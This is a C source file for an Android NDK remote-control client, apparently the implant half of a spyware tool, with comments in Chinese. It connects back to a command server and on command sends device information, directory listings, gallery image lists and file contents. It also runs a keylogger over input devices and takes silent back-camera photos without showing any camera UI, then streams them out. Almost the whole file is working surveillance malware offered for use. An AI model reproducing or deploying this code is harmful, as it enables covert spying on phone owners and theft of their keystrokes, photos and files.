/*
 * socket_client.c  —  Android 被控端 (NDK / C)
 * 编译: 使用 Android NDK 交叉编译
 *   $NDK/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android21-clang \
 *       socket_client.c -o client -lcamera2ndk -lmediandk -landroid
 *
 * 权限 (AndroidManifest.xml):
 *   <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
 *   <uses-permission android:name="android.permission.READ_MEDIA_IMAGES"/>
 *   <uses-permission android:name="android.permission.CAMERA"/>
 *   <uses-permission android:name="android.permission.INTERNET"/>
 *   <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE"/>
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <fcntl.h>

/* Android NDK 摄像头头文件 */
#include <camera/NdkCameraManager.h>
#include <camera/NdkCameraDevice.h>
#include <camera/NdkCameraCaptureSession.h>
#include <camera/NdkCameraMetadataTags.h>
#include <media/NdkImageReader.h>

#include "include/common.h"

/* ── 全局状态 ─────────────────────────────────────────── */
static int g_sock = -1;
static volatile int g_keylog_running = 0;
static pthread_t g_keylog_thread;

/* ── 1. 系统信息 ──────────────────────────────────────── */
static void handle_sysinfo(int sock) {
    char buf[BUFFER_SIZE];
    char prop[256];
    int len = 0;

    len += snprintf(buf + len, sizeof(buf) - len, "OK:");

    // 读取 Android 系统属性（通过 /system/build.prop）
    FILE *f = fopen("/system/build.prop", "r");
    if (f) {
        char line[256];
        const char *keys[] = {
            "ro.product.model", "ro.product.brand",
            "ro.build.version.release", "ro.build.version.sdk",
            "ro.product.cpu.abi", NULL
        };
        while (fgets(line, sizeof(line), f) && len < BUFFER_SIZE - 256) {
            for (int i = 0; keys[i]; i++) {
                if (strncmp(line, keys[i], strlen(keys[i])) == 0) {
                    line[strcspn(line, "\n")] = 0;
                    len += snprintf(buf + len, sizeof(buf) - len, "%s\n", line);
                }
            }
        }
        fclose(f);
    }

    // 内存信息
    f = fopen("/proc/meminfo", "r");
    if (f) {
        char line[128];
        int count = 0;
        while (fgets(line, sizeof(line), f) && count < 3) {
            line[strcspn(line, "\n")] = 0;
            len += snprintf(buf + len, sizeof(buf) - len, "%s\n", line);
            count++;
        }
        fclose(f);
    }

    // CPU 信息
    f = fopen("/proc/cpuinfo", "r");
    if (f) {
        char line[128];
        int count = 0;
        while (fgets(line, sizeof(line), f) && count < 4) {
            if (strncmp(line, "Hardware", 8) == 0 ||
                strncmp(line, "Processor", 9) == 0 ||
                strncmp(line, "model name", 10) == 0) {
                line[strcspn(line, "\n")] = 0;
                len += snprintf(buf + len, sizeof(buf) - len, "%s\n", line);
                count++;
            }
        }
        fclose(f);
    }

    len += snprintf(buf + len, sizeof(buf) - len, "\nEND\n");
    send(sock, buf, len, 0);
}

/* ── 2. 目录列表 ──────────────────────────────────────── */
static void handle_listdir(int sock, const char *path) {
    char buf[BUFFER_SIZE];
    int len = 0;

    DIR *dir = opendir(path);
    if (!dir) {
        snprintf(buf, sizeof(buf), "ERR:无法打开目录: %s (%s)", path, strerror(errno));
        send(sock, buf, strlen(buf), 0);
        return;
    }

    len += snprintf(buf + len, sizeof(buf) - len, "OK:");
    struct dirent *entry;
    struct stat st;
    char full_path[MAX_PATH_LEN];

    while ((entry = readdir(dir)) != NULL && len < BUFFER_SIZE - 256) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        snprintf(full_path, sizeof(full_path), "%s/%s", path, entry->d_name);
        char type = '-';
        long size = 0;

        if (stat(full_path, &st) == 0) {
            type = S_ISDIR(st.st_mode) ? 'd' : 'f';
            size = (long)st.st_size;
        }

        len += snprintf(buf + len, sizeof(buf) - len,
                        "[%c] %-40s %ld bytes\n", type, entry->d_name, size);
    }
    closedir(dir);

    len += snprintf(buf + len, sizeof(buf) - len, "\nEND\n");
    send(sock, buf, len, 0);
}

/* ── 3. 图库列表 ──────────────────────────────────────── */
// 递归扫描图片文件
static int scan_images(int sock, const char *dir_path, char *buf, int *len, int max) {
    DIR *dir = opendir(dir_path);
    if (!dir) return 0;

    struct dirent *entry;
    struct stat st;
    char full[MAX_PATH_LEN];

    while ((entry = readdir(dir)) != NULL && *len < max - 512) {
        if (entry->d_name[0] == '.') continue;
        snprintf(full, sizeof(full), "%s/%s", dir_path, entry->d_name);

        if (stat(full, &st) != 0) continue;

        if (S_ISDIR(st.st_mode)) {
            scan_images(sock, full, buf, len, max);
        } else {
            // 只列出图片
            const char *ext = strrchr(entry->d_name, '.');
            if (ext && (strcasecmp(ext, ".jpg") == 0 ||
                        strcasecmp(ext, ".jpeg") == 0 ||
                        strcasecmp(ext, ".png") == 0 ||
                        strcasecmp(ext, ".gif") == 0 ||
                        strcasecmp(ext, ".webp") == 0)) {
                *len += snprintf(buf + *len, max - *len,
                                 "%s  [%ld KB]\n", full, (long)st.st_size / 1024);
            }
        }
    }
    closedir(dir);
    return 0;
}

static void handle_gallery(int sock) {
    char buf[BUFFER_SIZE];
    int len = 0;

    len += snprintf(buf + len, sizeof(buf) - len, "OK:");

    // Android 常见图库路径
    const char *gallery_paths[] = {
        "/sdcard/DCIM",
        "/sdcard/Pictures",
        "/sdcard/Download",
        "/storage/emulated/0/DCIM",
        "/storage/emulated/0/Pictures",
        NULL
    };

    for (int i = 0; gallery_paths[i]; i++) {
        struct stat st;
        if (stat(gallery_paths[i], &st) == 0 && S_ISDIR(st.st_mode)) {
            len += snprintf(buf + len, sizeof(buf) - len,
                            "\n=== %s ===\n", gallery_paths[i]);
            scan_images(sock, gallery_paths[i], buf, &len, sizeof(buf) - 64);
        }
    }

    len += snprintf(buf + len, sizeof(buf) - len, "\nEND\n");
    send(sock, buf, len, 0);
}

/* ── 4. 获取文件内容 ──────────────────────────────────── */
static void handle_getfile(int sock, const char *path) {
    char header[64];
    struct stat st;

    if (stat(path, &st) != 0) {
        char err[256];
        snprintf(err, sizeof(err), "ERR:文件不存在: %s", path);
        send(sock, err, strlen(err), 0);
        return;
    }

    long fsize = (long)st.st_size;
    if (fsize > 5 * 1024 * 1024) { // 限制 5MB
        char err[64];
        snprintf(err, sizeof(err), "ERR:文件过大 (%ld bytes)", fsize);
        send(sock, err, strlen(err), 0);
        return;
    }

    // 发送 DATA 头
    int hlen = snprintf(header, sizeof(header), "DATA:%ld\n", fsize);
    send(sock, header, hlen, 0);

    // 发送文件内容
    FILE *f = fopen(path, "rb");
    if (!f) {
        send(sock, "ERR:无法读取文件", 16, 0);
        return;
    }

    char chunk[4096];
    size_t n;
    while ((n = fread(chunk, 1, sizeof(chunk), f)) > 0) {
        send(sock, chunk, (int)n, 0);
    }
    fclose(f);
}

/* ── 5. 键盘监听 ──────────────────────────────────────── */
// Android 键盘事件通过 /dev/input/event* 读取
// 需要 root 权限或 Accessibility Service

typedef struct {
    struct timeval time;
    unsigned short type;
    unsigned short code;
    int value;
} InputEvent;

// 键码映射（部分）
static const char *keycode_to_str(int code) {
    switch (code) {
        case 2:  return "1"; case 3:  return "2"; case 4:  return "3";
        case 5:  return "4"; case 6:  return "5"; case 7:  return "6";
        case 8:  return "7"; case 9:  return "8"; case 10: return "9";
        case 11: return "0"; case 28: return "[ENTER]"; case 14: return "[BS]";
        case 57: return " "; case 1:  return "[ESC]";
        case 15: return "[TAB]"; case 42: return "[SHIFT]";
        default: return NULL;
    }
}

static void *keylog_thread_func(void *arg) {
    int sock = *(int *)arg;
    char event_path[64];
    int event_fd = -1;

    // 查找键盘输入设备
    for (int i = 0; i < 10; i++) {
        snprintf(event_path, sizeof(event_path), "/dev/input/event%d", i);
        // 检查是否是键盘设备（简化：尝试打开）
        int fd = open(event_path, O_RDONLY | O_NONBLOCK);
        if (fd >= 0) {
            event_fd = fd;
            break;
        }
    }

    if (event_fd < 0) {
        // 无 root 权限时，通过 getevent 命令
        FILE *pipe = popen("getevent -l 2>/dev/null", "r");
        if (!pipe) {
            send(sock, "ERR:键盘监听需要root权限", 30, 0);
            return NULL;
        }

        char line[256];
        char msg[300];
        while (g_keylog_running && fgets(line, sizeof(line), pipe)) {
            if (strstr(line, "EV_KEY") && strstr(line, "DOWN")) {
                line[strcspn(line, "\n")] = 0;
                int mlen = snprintf(msg, sizeof(msg), "KEYEVENT:%s\n", line);
                send(sock, msg, mlen, 0);
            }
        }
        pclose(pipe);
        return NULL;
    }

    InputEvent ev;
    char msg[128];
    while (g_keylog_running) {
        int n = read(event_fd, &ev, sizeof(ev));
        if (n < (int)sizeof(ev)) {
            usleep(10000);
            continue;
        }
        // type=1 是 EV_KEY，value=1 是按下
        if (ev.type == 1 && ev.value == 1) {
            const char *key = keycode_to_str(ev.code);
            int mlen;
            if (key) {
                mlen = snprintf(msg, sizeof(msg), "KEYEVENT:%s\n", key);
            } else {
                mlen = snprintf(msg, sizeof(msg), "KEYEVENT:[code:%d]\n", ev.code);
            }
            send(sock, msg, mlen, 0);
        }
    }

    close(event_fd);
    return NULL;
}

static void handle_keylog_start(int sock) {
    if (g_keylog_running) return;
    g_keylog_running = 1;
    pthread_create(&g_keylog_thread, NULL, keylog_thread_func, &sock);
    send(sock, "OK:键盘监听已启动\n", 20, 0);
}

static void handle_keylog_stop(int sock) {
    g_keylog_running = 0;
    pthread_join(g_keylog_thread, NULL);
    send(sock, "OK:键盘监听已停止\n", 20, 0);
}

/* ── 6. 摄像头拍照（不打开相机UI）─────────────────────── */
// 使用 Android Camera2 NDK API 静默拍照

static ACameraManager *g_cam_mgr = NULL;
static ACameraDevice *g_cam_dev = NULL;
static ACameraCaptureSession *g_cam_session = NULL;
static AImageReader *g_img_reader = NULL;
static volatile int g_capture_done = 0;
static char g_capture_path[256] = "/sdcard/kiro_capture.jpg";

static void on_image_available(void *ctx, AImageReader *reader) {
    AImage *image = NULL;
    if (AImageReader_acquireLatestImage(reader, &image) != AMEDIA_OK) return;

    // 获取 JPEG 数据
    uint8_t *data = NULL;
    int len = 0;
    AImage_getPlaneData(image, 0, &data, &len);

    if (data && len > 0) {
        FILE *f = fopen(g_capture_path, "wb");
        if (f) {
            fwrite(data, 1, len, f);
            fclose(f);
        }
    }

    AImage_delete(image);
    g_capture_done = 1;
}

static void on_session_ready(void *ctx, ACameraCaptureSession *session) {
    // 创建拍照请求
    ACaptureRequest *request = NULL;
    ACameraOutputTarget *output = NULL;
    ANativeWindow *window = NULL;

    AImageReader_getWindow(g_img_reader, &window);
    ACameraDevice_createCaptureRequest(g_cam_dev, TEMPLATE_STILL_CAPTURE, &request);
    ACameraOutputTarget_create(window, &output);
    ACaptureRequest_addTarget(request, output);

    // 触发拍照
    ACameraCaptureSession_capture(session, NULL, 1, &request, NULL);

    ACaptureRequest_free(request);
    ACameraOutputTarget_free(output);
}

static void on_session_closed(void *ctx, ACameraCaptureSession *session) {}
static void on_session_active(void *ctx, ACameraCaptureSession *session) {}
static void on_device_disconnected(void *ctx, ACameraDevice *device) {}
static void on_device_error(void *ctx, ACameraDevice *device, int error) {}

static void handle_camera_capture(int sock) {
    g_capture_done = 0;

    // 初始化 CameraManager
    g_cam_mgr = ACameraManager_create();
    if (!g_cam_mgr) {
        send(sock, "ERR:无法创建CameraManager", 26, 0);
        return;
    }

    // 获取摄像头列表，选后置摄像头
    ACameraIdList *cam_list = NULL;
    ACameraManager_getCameraIdList(g_cam_mgr, &cam_list);
    if (!cam_list || cam_list->numCameras == 0) {
        send(sock, "ERR:未找到摄像头", 18, 0);
        ACameraManager_delete(g_cam_mgr);
        return;
    }

    const char *cam_id = cam_list->cameraIds[0]; // 默认第一个（通常是后置）

    // 检查是否是后置摄像头
    for (int i = 0; i < cam_list->numCameras; i++) {
        ACameraMetadata *meta = NULL;
        ACameraManager_getCameraCharacteristics(g_cam_mgr, cam_list->cameraIds[i], &meta);
        if (meta) {
            ACameraMetadata_const_entry entry;
            ACameraMetadata_getConstEntry(meta, ACAMERA_LENS_FACING, &entry);
            if (entry.data.u8[0] == ACAMERA_LENS_FACING_BACK) {
                cam_id = cam_list->cameraIds[i];
                ACameraMetadata_free(meta);
                break;
            }
            ACameraMetadata_free(meta);
        }
    }

    // 创建 ImageReader（JPEG 格式，1920x1080）
    AImageReader_new(1920, 1080, AIMAGE_FORMAT_JPEG, 2, &g_img_reader);
    AImageReader_ImageListener listener = {NULL, on_image_available};
    AImageReader_setImageListener(g_img_reader, &listener);

    // 打开摄像头设备
    ACameraDevice_StateCallbacks dev_cb = {
        NULL, on_device_disconnected, on_device_error
    };
    ACameraManager_openCamera(g_cam_mgr, cam_id, &dev_cb, &g_cam_dev);

    // 等待设备打开
    usleep(500000); // 500ms

    // 创建捕获会话
    ANativeWindow *window = NULL;
    AImageReader_getWindow(g_img_reader, &window);

    ACaptureSessionOutputContainer *outputs = NULL;
    ACaptureSessionOutputContainer_create(&outputs);
    ACaptureSessionOutput *output = NULL;
    ACaptureSessionOutput_create(window, &output);
    ACaptureSessionOutputContainer_add(outputs, output);

    ACameraCaptureSession_stateCallbacks session_cb = {
        NULL, on_session_closed, on_session_active, on_session_ready
    };
    ACameraDevice_createCaptureSession(g_cam_dev, outputs, &session_cb, &g_cam_session);

    // 等待拍照完成（最多 5 秒）
    int timeout = 50;
    while (!g_capture_done && timeout-- > 0) {
        usleep(100000); // 100ms
    }

    // 清理资源
    if (g_cam_session) ACameraCaptureSession_close(g_cam_session);
    if (g_cam_dev)     ACameraDevice_close(g_cam_dev);
    if (g_img_reader)  AImageReader_delete(g_img_reader);
    ACaptureSessionOutputContainer_free(outputs);
    ACaptureSessionOutput_free(output);
    ACameraManager_deleteCameraIdList(cam_list);
    ACameraManager_delete(g_cam_mgr);

    if (!g_capture_done) {
        send(sock, "ERR:拍照超时", 14, 0);
        return;
    }

    // 发送图片数据
    struct stat st;
    if (stat(g_capture_path, &st) != 0) {
        send(sock, "ERR:图片文件不存在", 20, 0);
        return;
    }

    char header[64];
    int hlen = snprintf(header, sizeof(header), "DATA:%ld\n", (long)st.st_size);
    send(sock, header, hlen, 0);

    FILE *f = fopen(g_capture_path, "rb");
    if (f) {
        char chunk[4096];
        size_t n;
        while ((n = fread(chunk, 1, sizeof(chunk), f)) > 0) {
            send(sock, chunk, (int)n, 0);
        }
        fclose(f);
    }
}

/* ── 主循环 ───────────────────────────────────────────── */
int main(int argc, char *argv[]) {
    const char *server_ip = argc > 1 ? argv[1] : "192.168.1.100";

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("socket");
        return 1;
    }

    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port   = htons(PORT);
    inet_pton(AF_INET, server_ip, &addr.sin_addr);

    printf("[*] 连接到 %s:%d ...\n", server_ip, PORT);
    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("connect");
        return 1;
    }
    printf("[+] 已连接\n");
    g_sock = sock;

    char buf[BUFFER_SIZE];
    while (1) {
        memset(buf, 0, sizeof(buf));
        int n = recv(sock, buf, sizeof(buf) - 1, 0);
        if (n <= 0) {
            printf("[*] 连接断开\n");
            break;
        }
        buf[n] = '\0';

        printf("[CMD] %s\n", buf);

        if (strcmp(buf, CMD_SYSINFO) == 0) {
            handle_sysinfo(sock);
        } else if (strncmp(buf, CMD_LISTDIR, strlen(CMD_LISTDIR)) == 0) {
            handle_listdir(sock, buf + strlen(CMD_LISTDIR));
        } else if (strcmp(buf, CMD_GALLERY) == 0) {
            handle_gallery(sock);
        } else if (strncmp(buf, CMD_GETFILE, strlen(CMD_GETFILE)) == 0) {
            handle_getfile(sock, buf + strlen(CMD_GETFILE));
        } else if (strcmp(buf, CMD_KEYLOG_START) == 0) {
            handle_keylog_start(sock);
        } else if (strcmp(buf, CMD_KEYLOG_STOP) == 0) {
            handle_keylog_stop(sock);
        } else if (strcmp(buf, CMD_CAMERA_CAPTURE) == 0) {
            handle_camera_capture(sock);
        } else if (strcmp(buf, CMD_EXIT) == 0) {
            printf("[*] 收到退出指令\n");
            break;
        }
    }

    close(sock);
    return 0;
}
